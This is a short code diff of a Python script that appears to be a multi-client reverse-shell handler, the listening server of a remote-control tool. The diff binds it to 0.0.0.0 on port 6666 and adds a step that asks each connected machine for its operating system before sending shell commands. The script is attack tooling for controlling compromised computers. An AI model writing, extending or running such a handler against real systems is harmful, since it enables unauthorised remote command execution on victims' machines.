@@ -7,7 +7,7 @@ all_addresses = []
 queue = Queue()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-s.bind(("",8000))  
+s.bind(("0.0.0.0",6666))  
 print("""  
 
 ███╗░░░███╗██╗░░░██╗██╗░░░░░████████╗██╗  ░█████╗░██╗░░░░░██╗███████╗███╗░░██╗████████╗
@@ -71,7 +71,13 @@ def Greater_Console():
         else:
             print("Command not recognized")
 def commands(conn):
-    conn.send("cd C:\\".encode("utf-8"))
+    getting_system = conn.send("get os".encode("utf-8"))
+    operating_system = conn.recv(6000).decode("utf-8")
+    print(operating_system)
+    if operating_system == "posix":
+        conn.send("cd /".encode("utf-8"))
+    else:
+        conn.send("cd C:\\".encode("utf-8"))
     y = conn.recv(6000).decode("utf-8")
     while True: 
         print(y,end ="")
@@ -144,3 +150,4 @@ def run():
     queue.join()
 threader()
 run()
+
